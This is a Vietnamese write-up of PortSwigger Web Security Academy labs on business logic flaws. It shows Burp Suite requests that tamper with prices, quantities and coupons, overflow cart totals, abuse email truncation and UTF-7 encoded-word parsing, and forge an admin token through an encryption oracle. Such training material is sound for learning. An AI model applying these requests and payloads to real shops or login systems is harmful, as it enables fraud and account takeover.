# Business logic vulnerabilities

## **Lab: Excessive trust in client-side controls**

[Lab: Excessive trust in client-side controls | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)

- Thực hiện login vào tài khoản `wiener:peter`.
- Thực hiện chọn sản phẩm `Lightweight "l33t" Leather Jacket`
- Tại đây, chọn một số lượng hợp lệ và thêm vào giỏ hàng
    
    ![image.png](Business%20logic%20vulnerabilities/image.png)
    
- Trong phần mềm BurpSuite, thực hiện bắt Request gửi tới API `POST /cart`. Tại đây, thực hiện chỉnh sửa param `price` thành giá trị theo ý muốn (thường là sẽ chọn nhỏ hơn, ở đây nếu để số âm thì server sẽ cho rằng không hợp lệ nên sẽ chọn số dương)
    - Request
        
        ![image.png](Business%20logic%20vulnerabilities/image%201.png)
        
- Điều hướng đến chức năng `Giỏ hàng`
    
    ![image.png](Business%20logic%20vulnerabilities/image%202.png)
    

- Tại đây, quan sát thấy giá hàng đã bị thay đổi theo input người dùng
    
    ![image.png](Business%20logic%20vulnerabilities/image%203.png)
    
- Thực hiện mua sản phẩm. Quan sát thấy đã mua sản phẩm thành công với giá trị thấp hơn ban đầu. Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%204.png)
    

## **Lab: High-level logic vulnerability**

[Lab: High-level logic vulnerability | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)

- Thực hiện login bằng user `wiener:peter`.
- Thực hiện chọn một sản phẩm cần mua. Thêm vào giỏ hàng.
    
    ![image.png](Business%20logic%20vulnerabilities/image%205.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt Request gửi tới API `POST /cart` và chỉnh sửa param `quantity` thành số âm.
    - Request
        
        ![image.png](Business%20logic%20vulnerabilities/image%206.png)
        
- Điều hướng đến chức năng `Giỏ hàng`.
    
    ![image.png](Business%20logic%20vulnerabilities/image%207.png)
    
- Tại đây, quan sát thấy giá tiền tổng sản phẩm là số âm
    
    ![image.png](Business%20logic%20vulnerabilities/image%208.png)
    
- Tuy nhiên chúng ta không được phép thanh toán với số tiền âm. Vì vậy, chúng ta chỉ có thể giảm tổng tiền mua bằng cách mua một sản phẩm với giá tiền âm và sản phẩm còn lại là dương. Khi đó chúng ta có thể mua hàng với giá nhỏ hơn giá ban đầu.
- Thực hiện thay đổi số lượng sản phẩm để khi cộng tổng thì giá sẽ nhỏ hơn số tiền chúng ta có như sau:
    - Thực hiện tạo sản phấm với số tiền âm phù hợp bằng cách chỉnh sửa quantity của API `POST /cart`
        - Request
            
            ![image.png](Business%20logic%20vulnerabilities/image%209.png)
            
    - Quan sát giao diện, nhận thấy tổng tiền đã được trừ
        
        ![image.png](Business%20logic%20vulnerabilities/image%2010.png)
        
    - Thực hiện thanh toán thành công. Hoàn thành giải lab
        
        ![image.png](Business%20logic%20vulnerabilities/image%2011.png)
        

## **Lab: Inconsistent security controls**

[Lab: Inconsistent security controls | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)

- Thực hiện đăng ký với account bất kỳ bằng email có sẵn.
- Thực hiện login với account đã đăng ký.
- Điều hướng đến chức năng `My account`
    
    ![image.png](Business%20logic%20vulnerabilities/image%2012.png)
    
- Tại đây, thực hiện update email với domain là `@dontwannacry.com`
- Thực hiện update email thành công. Quan sát thấy có `Admin panel` hiện ra
    
    ![image.png](Business%20logic%20vulnerabilities/image%2013.png)
    
- Thực hiện xóa user `Carlos` thành công bằng quyền admin. Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2014.png)
    

## **Lab: Flawed enforcement of business rules**

[Lab: Flawed enforcement of business rules | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)

- Thực hiện login vào user `wiener:peter`
- Thực hiện chọn mua một sản phẩm. Tiến hành thanh toán với 2 coupon lấy được là `NEWCUST5` và `SIGNUP30` .
    
    ![image.png](Business%20logic%20vulnerabilities/image%2015.png)
    
- Ở đây, có một bug logic đó là server chỉ kiểm tra coupon gần nhất sử dụng nhờ đó 1 counpon có thể dùng nhiều lần.
    
    ![image.png](Business%20logic%20vulnerabilities/image%2016.png)
    
- Sau đó, thực hiện chọn mua sản phẩm `Lightweight "l33t" Leather Jacket` . Áp dụng counpon theo cách trên → giảm giá còn $0.00
    - Sử dụng BurpIntruder để áp dụng nhanh coupon
        - Request
            
            ```jsx
            POST /cart/coupon HTTP/2
            Host: 0abc002004f814778532199700590095.web-security-academy.net
            Cookie: session=Cq6gNlltAEXGa0jz14NLTbtXlHwOXkTx
            User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
            Accept-Language: en-US,en;q=0.9
            Accept-Encoding: gzip, deflate, br
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 53
            Origin: https://0abc002004f814778532199700590095.web-security-academy.net
            Referer: https://0abc002004f814778532199700590095.web-security-academy.net/cart?couponError=COUPON_ALREADY_APPLIED&coupon=NEWCUST5
            Upgrade-Insecure-Requests: 1
            Sec-Fetch-Dest: document
            Sec-Fetch-Mode: navigate
            Sec-Fetch-Site: same-origin
            Sec-Fetch-User: ?1
            Priority: u=0, i
            Te: trailers
            
            csrf=OK9adADQ5HRkm2jKBmK4fDNBf6Dd5x3s&coupon=SIGNUP30
            ```
            
        - Setting
            
            ![image.png](Business%20logic%20vulnerabilities/image%2017.png)
            
- Quan sát tại vị trí đặt hàng đã giảm số tiền về 0
    
    ![image.png](Business%20logic%20vulnerabilities/image%2018.png)
    
- Tiến hành đặt hàng và hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2019.png)
    

## **Lab: Low-level logic flaw**

[Lab: Low-level logic flaw | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)

- Trước hết, login vào tài khoản `wiener:peter` .
- Thực hiện chọn 1 sản phẩm. Thêm sản phẩm đó vào giỏ hàng.
- Trong phần mềm Burpsuite, thực hiện bắt Request gửi tới API `POST /cart` . Tại  đây, phía backend kiểm tra giá trị `quantity` nếu lớn hơn `99` sẽ không hợp lệ. Tuy nhiên, người dùng lại có thể cộng dồn `quantity` → nếu vượt qua giới hạn của biến thì có gây ra số âm → số tiền âm → giảm tổng tiền.
- Trước hết, dùng BurpIntruder để gửi Request tới API `POST /cart` nhiều lần, quan sát thấy sau một số lần đủ lớn, số tiền đã trở thành âm.
    - Request
        
        ![image.png](Business%20logic%20vulnerabilities/image%2020.png)
        
    - POC số tiền âm
        
        ![image.png](Business%20logic%20vulnerabilities/image%2021.png)
        
- Thực hiện gửi lại sản phẩm nhưng với quantity dương để cộng lên 1 số dương nhưng vẫn nhỏ hơn số tiền user hiện có. Chỗ này, thì vì mỗi lần chỉ cộng dồn 1 chút nên mỗi lần cộng thêm sẽ bị trừ đi ⇒ dù tổng thể lớn hơn giới hạn nhưng không bị tràn và thành số âm nữa bởi nó bị trừ dần rồi. Dưới đây là kết quả để tạo ra số tiền dương nhỏ hơn
    - Request cộng thêm sản phẩm khác
        
        ![image.png](Business%20logic%20vulnerabilities/image%2022.png)
        
    - Kết quả
        
        ![image.png](Business%20logic%20vulnerabilities/image%2023.png)
        
- Thực hiện mua hàng với giá tiền trên thành công. Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2024.png)
    

## **Lab: Inconsistent handling of exceptional input**

[Lab: Inconsistent handling of exceptional input | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)

- Thực hiện đăng ký với email dài với domain của attacker như sau:
    - Request
        
        ```jsx
        POST /register HTTP/2
        Host: 0a3c00110487880084196e5e00d30000.web-security-academy.net
        Cookie: session=dFXUfdVKaugOLgQTnXFHBLllDVKeUvfW
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 537
        Origin: https://0a3c00110487880084196e5e00d30000.web-security-academy.net
        Referer: https://0a3c00110487880084196e5e00d30000.web-security-academy.net/register
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=YPr32SXu50xnZOrbCwJpZdt6xUq0PmfO&username=dat1&email=<aaa...>@exploit-0ac0004f04a0881784936d13019e0042.exploit-server.net&password=1
        ```
        
        ![image.png](Business%20logic%20vulnerabilities/image%2025.png)
        

- Đăng nhập vào tài khoản vừa đăng ký thành công. Điều hướng đến chức năng `My account` , nhận thấy email hiện ra không còn phần đuôi và chỉ hiện đúng 255 ký tự
    
    ![image.png](Business%20logic%20vulnerabilities/image%2026.png)
    
- Trong quá trình fuzzing, mình thấy có path `/admin` nhưng chỉ có thể truy cập từ user thuộc `DontWannaCry` ⇒ có thể họ sẽ kiểm tra user  bằng email
- Thực hiện đăng ký account khác với email như sau:
    - Email
        
        ```jsx
        aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com
        ```
        
    - Request
        
        ```jsx
        POST /register HTTP/2
        Host: 0a3c00110487880084196e5e00d30000.web-security-academy.net
        Cookie: session=C7Tf2C99E8cz9SPou9dvBOznU36Haw6j
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 385
        Origin: https://0a3c00110487880084196e5e00d30000.web-security-academy.net
        Referer: https://0a3c00110487880084196e5e00d30000.web-security-academy.net/register
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=BnkENiKhBTRBxuMrGcBgyLaawL5o035j&username=dat12&email=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0ac0004f04a0881784936d13019e0042.exploit-server.net&password=1
        ```
        
- Sau đó, đăng ký thành công và login vào tài khoản đã đăng ký. Điều hướng đến chức năng `My account` . Quan sát thấy có admin panel
    
    ![image.png](Business%20logic%20vulnerabilities/image%2027.png)
    
- Thực hiện truy cập, xóa thành công user `Carlos` . Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2028.png)
    

## **Lab: Weak isolation on dual-use endpoint**

[Lab: Weak isolation on dual-use endpoint | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)

- Login vào tài khoản `wiener:peter`
- Điều hướng đến chức năng `My account`
    
    ![image.png](Business%20logic%20vulnerabilities/image%2029.png)
    
- Tại đây, thực hiện thay đổi mật khẩu.
    
    ![image.png](Business%20logic%20vulnerabilities/image%2030.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /my-account/change-password` . Thực hiện xóa param `current-password`  và đổi username thành `administrator`  Chuyển tiếp request
    - Request
        
        ```jsx
        POST /my-account/change-password HTTP/2
        Host: 0a0e00dc04c2f64f8073210c00ef0073.web-security-academy.net
        Cookie: session=bmiHAkJ2MIfdp2UiZfB07Z9Kuujbxskg
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 126
        Origin: https://0a0e00dc04c2f64f8073210c00ef0073.web-security-academy.net
        Referer: https://0a0e00dc04c2f64f8073210c00ef0073.web-security-academy.net/my-account?id=wiener
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=hNSl6EIwUgsorHTXXy5t5l1gooQ5QHjx&username=administrator&new-password-1=peter&new-password-2=peter
        ```
        
        ![image.png](Business%20logic%20vulnerabilities/image%2031.png)
        
- Thực hiện login tài khoản `administrator` với mật khẩu update thành công. Thực hiện xóa user `carlos` và hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2032.png)
    
- Code phía backend có thể như này
    
    ```jsx
    def change_password_request(username, current_password, new_password):
        
        if current_password is not None:
            if not verify_password(logged_in_user, current_password):
                return "Mật khẩu hiện tại không đúng!"
        
        update_password_in_db(username, new_password)
        return "Thay đổi mật khẩu thành công!"
    ```
    

## **Lab: Insufficient workflow validation**

[Lab: Insufficient workflow validation | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation)

- Thực hiện login vào tài khoản `wiener:peter`
- Thực hiện thêm sản phẩm `Lightweight "l33t" Leather Jacket` vào giỏ hàng
    
    ![image.png](Business%20logic%20vulnerabilities/image%2033.png)
    
- Thực hiện gửi request sau. Quan sát thấy đơn hàng được mua thành công mà không bị trừ tiền
    - Request
        
        ```jsx
        GET /cart/order-confirmation?order-confirmed=true HTTP/2
        Host: 0aad004e04cd2315815007c000ef006b.web-security-academy.net
        Cookie: session=hW1BgqUevIezMNAfnyQefx8NtyQONCBR
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0aad004e04cd2315815007c000ef006b.web-security-academy.net/cart
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ```
        
        ![image.png](Business%20logic%20vulnerabilities/image%2034.png)
        
- Code phía backend xử lý như sau sẽ bị lỗ hổng này
    
    ```jsx
    @app.route('/cart/checkout', methods=['POST'])
    def checkout():
        if user.has_enough_money(total_price):
            user.subtract_money(total_price)
            # Sau khi trừ tiền, hệ thống điều hướng bạn sang trang xác nhận
            return redirect('/cart/order-confirmation')
    
    @app.route('/cart/order-confirmation')
    def confirm_order():
        user_cart = get_current_cart(session['user_id'])
        process_shipping(user_cart) 
        return "Chúc mừng! Bạn đã mua hàng thành công."
    ```
    

## **Lab: Authentication bypass via flawed state machine**

[Lab: Authentication bypass via flawed state machine | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)

- Thực hiện login vào tài khoản `wiener:peter`
- Thực hiện Intercept Response của Request gửi tới API  `POST /login` như sau:
    
    ![image.png](Business%20logic%20vulnerabilities/image%2035.png)
    
- Thực hiện chỉnh sửa header `Location` của response của request trên như sau
    - Response
        
        ```jsx
        HTTP/2 302 Found
        Location: /admin
        Set-Cookie: session=V92jNF16mr3duWhXLha1p79ogVHpqC6Q; Secure; HttpOnly; SameSite=None
        X-Frame-Options: SAMEORIGIN
        Content-Length: 0
        
        ```
        

![image.png](Business%20logic%20vulnerabilities/image%2036.png)

- Quan sát thấy truy cập vào admin panel thành công. Thực hiện xóa user `carlos` . Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2037.png)
    

## **Lab: Infinite money logic flaw**

[Lab: Infinite money logic flaw | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)

- Thực hiện login vào account `wiener:peter`
- Quan sát thấy khi thực hiện chức năng `Sign up to our newsletter!`thì nhận được coupon dùng nhiều lần
    
    ![image.png](Business%20logic%20vulnerabilities/image%2038.png)
    
    ![image.png](Business%20logic%20vulnerabilities/image%2039.png)
    
- Khi thực hiện mua sản phẩm `Gift card` , nhận thấy có thể hoàn trả và nhận lại đúng số tiền 10.00$
    
    ![image.png](Business%20logic%20vulnerabilities/image%2040.png)
    

- Như vậy, nếu như chúng ta mua sản phẩm trên với voucher sau đó redeem thì mỗi lần có thể nhận thêm tiền.
- Để dễ dàng hơn cho việc lấy tiền, chúng ta có thể dùng Burp macro và set up như sau
    - Macro
        - Thực hiện tạo Macro với 4 request sau
            
            ![image.png](Business%20logic%20vulnerabilities/image%2041.png)
            
        - Thực hiện config request cuối để lấy `code` từ response như sau
            
            ![image.png](Business%20logic%20vulnerabilities/image%2042.png)
            
- Thực hiện gửi request sau trong Burp intruder
    - Request
        
        ```jsx
        POST /gift-card HTTP/2
        Host: 0acb0048040adbe1816c3e7700f8003b.web-security-academy.net
        Cookie: session=wD9sobgo7jmxknw47GnDyvixG6ofNLMw
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 58
        Origin: https://0acb0048040adbe1816c3e7700f8003b.web-security-academy.net
        Referer: https://0acb0048040adbe1816c3e7700f8003b.web-security-academy.net/my-account?id=wiener
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=Bn10ueouMek1U06FiQJLOLJGk5QdxFTd&gift-card=Pcr7pwVreI
        ```
        
    - Config với null payload
        
        ![image.png](Business%20logic%20vulnerabilities/image%2043.png)
        
    

- Quan sát thấy chúng ta có thể có được số tiền lớn hơn ban đầu mà không cần nạp
    
    ![image.png](Business%20logic%20vulnerabilities/image%2044.png)
    
- Thực hiện mua hàng thành công. Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2045.png)
    

## **Lab: Authentication bypass via encryption oracle**

[Lab: Authentication bypass via encryption oracle | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)

- Thực hiện login vào account `wiener:peter`
- Điều hướng đến chức năng `My account > Update email`
    
    ![image.png](Business%20logic%20vulnerabilities/image%2046.png)
    
- Thực hiện update email không hợp lệ. Trong phần mềm Burpsuite, chúng ta quan sát thấy có thêm param `notification` trả về đồng thời giao diện hiển thị thêm một thông báo lỗi ⇒ có thể phía server đã decrypt param này và render lên giao diện
    - POC
        
        ![image.png](Business%20logic%20vulnerabilities/image%2047.png)
        
        ![image.png](Business%20logic%20vulnerabilities/image%2048.png)
        
- Tiếp theo, khi chúng ta thực hiện chọn chức năng `Stay log in` , chúng ta thấy rằng trong cookie có thêm một param `stay-logged-in` cho phép ghi nhớ người dùng cũng có dạng mã hóa giống notification → có thể tạo ra token người khác
- Thực hiện chỉnh sửa request gửi tới API `POST /my-account/change-email`  bằng cách đăng ký email với 9 bytes junk ở trước nhờ đó để ghép với chuỗi `Invalid email address:` tạo đủ 32 bytes, nhờ vậy có thể cắt được 32 bytes còn lại làm token
    - Số byte chuỗi ban đầu
        
        ![image.png](Business%20logic%20vulnerabilities/image%2049.png)
        
    - Request
        
        ```jsx
        POST /my-account/change-email HTTP/2
        Host: 0afc00f4037e75ff8233c9a00088000c.web-security-academy.net
        Cookie: notification=%2bktCG%2fKnvc5Uy0h%2fcaT7s8oSMLhMozm13lZJAHhLIfA%3d; session=N3zxiv1ewzekx31pfcl5UNMENDcjSfaK; stay-logged-in=S2OQeIMbFIRKKs9z0k0s6SdibG0ihPmjSMmSEMESkQM%3d
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 78
        Origin: https://0afc00f4037e75ff8233c9a00088000c.web-security-academy.net
        Referer: https://0afc00f4037e75ff8233c9a00088000c.web-security-academy.net/my-account
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        email=111111111administrator%3a100000000&csrf=xNZQLe9PqCpv6yD4EaJnGYsTbeBuU6XL
        ```
        
    - Response
        
        ![image.png](Business%20logic%20vulnerabilities/image%2050.png)
        
- Thực hiện đưa chuỗi lấy được từ response trên, chuyển sang tab decoder và thực hiện cắt byte như sau:
    - Thực hiện URL decode, base64 decode chuyển sang hex view và chọn cắt 32 bytes đầu tiên. Tiếp tục base64 encode
        
        ![image.png](Business%20logic%20vulnerabilities/image%2051.png)
        
- Thực hiện gửi token vừa tạo. Quan sát thấy vào tài khoản admin thành công
    
    ![image.png](Business%20logic%20vulnerabilities/image%2052.png)
    

- Thực hiện vào `Admin panel` và xóa user `carlos` . Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2053.png)
    

## **Lab: Bypassing access controls using email address parsing discrepancies**

[Lab: Bypassing access controls using email address parsing discrepancies | Web Security Academy](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies)

- Thực hiện điều hướng đến chức năng `Register`
    
    ![image.png](Business%20logic%20vulnerabilities/image%2054.png)
    
- Ở đây, chỉ có thể sử dụng email với domain là `ginandjuice.shop`
    
    ![image.png](Business%20logic%20vulnerabilities/image%2055.png)
    
    ![image.png](Business%20logic%20vulnerabilities/image%2056.png)
    
- Tiếp theo đó là fuzzing, nhận thấy với cách encode `utf-8` và `iso-8859-1` bị chặn nhưng `utf-7` thì không bị
    - Payload
        - utf-8
            
            ```jsx
            =?utf-8?q?=61=62=63?=@ginandjuice.shop
            ```
            
        - utf-7
            
            ```jsx
            =?utf-7?q?%26AGEAYgBj-?=@ginandjuice.shop
            ```
            
        - Dùng `x`
            
            ```jsx
            =?x?q?=61=62=63?=@ginandjuice.shop
            =?x?q?%26AGEAYgBj-?=@ginandjuice.shop
            ```
            
    - POC
        
        ![image.png](Business%20logic%20vulnerabilities/image%2057.png)
        
        ![image.png](Business%20logic%20vulnerabilities/image%2058.png)
        
- Sau đó, mình thực hiện encode ký tự `@` và  `` với email của attacker thì được token gửi về
    - Payload
        
        ```jsx
        =?utf-7?q?attacker1%26AEA-exploit-0a9100fa04d0775580b92afd01d800a4.exploit-server.net%26ACA-?=@ginandjuice.shop
        ```
        
    - Kết quả
        
        ![image.png](Business%20logic%20vulnerabilities/image%2059.png)
        
- Thực hiện truy cập email, lấy token và login thành công xóa user Carlos. Hoàn thành giải lab
    
    ![image.png](Business%20logic%20vulnerabilities/image%2060.png)
    
    ![image.png](Business%20logic%20vulnerabilities/image%2061.png)